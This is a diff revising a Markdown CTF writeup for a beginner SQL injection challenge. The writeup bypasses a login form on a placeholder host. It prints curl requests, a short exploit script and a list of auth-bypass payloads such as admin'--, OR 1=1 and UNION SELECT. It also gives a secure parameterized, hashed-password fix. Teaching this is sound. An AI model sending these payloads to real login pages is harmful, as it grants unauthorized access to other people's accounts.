@@ -1,6 +1,13 @@
 ---
 title: "Sample Web Challenge: SQL Injection Basic"
 description: "CTF writeup: Bypass authentication with SQL injection using admin'-- payload. Learn web exploitation basics, injection testing & OWASP security concepts."
+tags:
+  - ctf-writeup
+  - web
+  - sql-injection
+  - beginner
+  - authentication-bypass
+updated: 2026-11-07
 ---
 
 # 🌐 Sample Web Challenge: SQL Injection Basic
@@ -20,7 +27,7 @@ description: "CTF writeup: Bypass authentication with SQL injection using admin'
 **TL;DR**: Basic SQL injection vulnerability in login form allowing authentication bypass with `admin'--` username.
 
 ### Challenge Description
-```
+```text
 We have a simple login page for our admin panel. 
 Can you find a way to log in as admin without knowing the password?
 
@@ -35,9 +42,11 @@ URL: http://challenge.example.com:1337/login
 ## 🔍 Analysis
 
 ### Initial Reconnaissance
+*The curl transcripts in this writeup are illustrative (`challenge.example.com` is a placeholder host); the SQL behaviour was checked against SQLite.*
+
 Let's start by examining the login page:
 
-```bash
+```text
 $ curl -s http://challenge.example.com:1337/login | grep -i form
 <form method="POST" action="/login">
   <input type="text" name="username" placeholder="Username" required>
@@ -52,7 +61,7 @@ $ curl -s http://challenge.example.com:1337/login | grep -i form
 3. **Basic HTML Form**: Simple implementation suggests potential vulnerabilities
 
 Let's try a normal login attempt:
-```bash
+```text
 $ curl -X POST http://challenge.example.com:1337/login \
     -d "username=test&password=test"
     
@@ -68,18 +77,18 @@ Response: "Invalid credentials"
 Since this appears to be a basic login form, let's test for SQL injection vulnerabilities.
 
 1. **Step 1**: Test basic SQL injection payloads
-   ```bash
+   ```text
    # Test single quote
    $ curl -X POST http://challenge.example.com:1337/login \
        -d "username=admin'&password=test"
    
-   Response: "SQL syntax error near 'admin'' at line 1"
+   Response: SQL error: near "test": syntax error
    ```
    
-   🎯 **Bingo!** The error message reveals this is vulnerable to SQL injection.
+   🎯 **Bingo!** The error message reveals this is vulnerable to SQL injection — and `near "…": syntax error` is SQLite's wording, which tells us which comment syntax will work.
 
 2. **Step 2**: Craft SQL injection payload to bypass authentication
-   ```bash
+   ```text
    # Use comment to ignore password check
    $ curl -X POST http://challenge.example.com:1337/login \
        -d "username=admin'--&password=anything"
@@ -88,8 +97,8 @@ Since this appears to be a basic login form, let's test for SQL injection vulner
    ```
 
 3. **Step 3**: Verify with different payloads
-   ```bash
-   # Alternative payload
+   ```text
+   # Alternative payload (matches every row; the app logs in as the first one, admin)
    $ curl -X POST http://challenge.example.com:1337/login \
        -d "username=admin' OR '1'='1'--&password=test"
    
@@ -106,12 +115,12 @@ Since this appears to be a basic login form, let's test for SQL injection vulner
 
 ### Key Technical Concepts
 - **SQL Injection**: Malicious SQL statements inserted into application queries
-- **Comment Syntax**: `--` in SQL comments out the rest of the query
+- **Comment Syntax**: `--` comments out the rest of the query (SQLite/PostgreSQL; MySQL needs `-- ` with a trailing space, or `#`)
 - **Authentication Bypass**: Using injection to make login condition always true
 
 ### Vulnerable Code (Hypothetical)
 ```sql
--- Likely vulnerable query in backend:
+-- Likely vulnerable query in backend (SQLite, per the error message):
 SELECT * FROM users WHERE username = '$username' AND password = '$password';
 
 -- With our payload (admin'--):
@@ -144,7 +153,7 @@ echo "Flag found: $flag"
 ```
 
 ### Execution Output
-```bash
+```text
 $ bash exploit.sh
 Attempting SQL injection...
 Response: Welcome admin! Flag: flag{sql_injection_basic_bypass_123}
@@ -155,7 +164,7 @@ Flag found: flag{sql_injection_basic_bypass_123}
 
 ## 🏁 Flag
 
-```
+```text
 flag{sql_injection_basic_bypass_123}
 ```
 
@@ -169,7 +178,7 @@ flag{sql_injection_basic_bypass_123}
 - Simple exploit development
 
 ### Challenges Faced  
-- None - this was a straightforward beginner challenge
+- `admin'--` only works because the backend is SQLite (see the error wording); on MySQL the same payload is a syntax error and needs `admin'-- -` or `admin'#`
 
 ### Learning Outcomes
 - **SQL Injection Basics**: Understanding how unsanitized input can break SQL queries
@@ -192,6 +201,11 @@ flag{sql_injection_basic_bypass_123}
 ### Further Reading
 - [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) - Advanced payloads
 - [SQLMap Tutorial](https://github.com/sqlmapproject/sqlmap/wiki/Usage) - Automated SQL injection
+
+### Related
+- [[sop-web-application-security|Web Application Security SOP]] - Full web testing methodology
+- [[CTF_Cheat_Sheets]] - Quick payload reference
+- [[Writeups-Index]] - All sample writeups
 
 ---
 
@@ -222,24 +236,34 @@ flag{sql_injection_basic_bypass_123}
 
 ### Other Payloads That Work
 ```sql
--- Authentication bypass variations
+-- Authentication bypass variations (SQLite/PostgreSQL comment syntax)
+-- OR-based payloads match every row; the app logs in as the first one
 admin'--
 admin' OR '1'='1'--
 admin' OR 1=1--
 ' OR '1'='1'--
 ' OR 1=1--
 
--- Union-based (if applicable)
+-- Union-based (only if the column count matches the users table)
 admin' UNION SELECT 1,2,3--
 ```
 
 ### Prevention Measures
+Parameterize the query and never compare passwords in SQL: look the user up by username only, then verify a stored argon2id hash in application code (`argon2-cffi`; `bcrypt.checkpw` is the bcrypt equivalent).
+
 ```python
-# Secure code example (using parameterized queries)
-cursor.execute(
-    "SELECT * FROM users WHERE username = %s AND password = %s", 
-    (username, password)
-)
+# Secure code example (parameterized query + password hash check)
+from argon2 import PasswordHasher
+from argon2.exceptions import InvalidHashError, VerificationError
+
+ph = PasswordHasher()  # argon2id; store ph.hash(password) at registration
+
+cursor.execute("SELECT id, password_hash FROM users WHERE username = ?", (username,))
+row = cursor.fetchone()
+try:
+    authenticated = row is not None and ph.verify(row[1], password)
+except (VerificationError, InvalidHashError):  # wrong password or corrupt stored hash
+    authenticated = False
 ```
 
 ---
@@ -249,5 +273,6 @@ cursor.execute(
 **First Blood**: `NO` 
 **Published**: `2024-01-15`
 
-## Tags
-#ctf-writeup #web #sql-injection #beginner #authentication-bypass
+---
+
+**Last Updated:** 2026-11-07
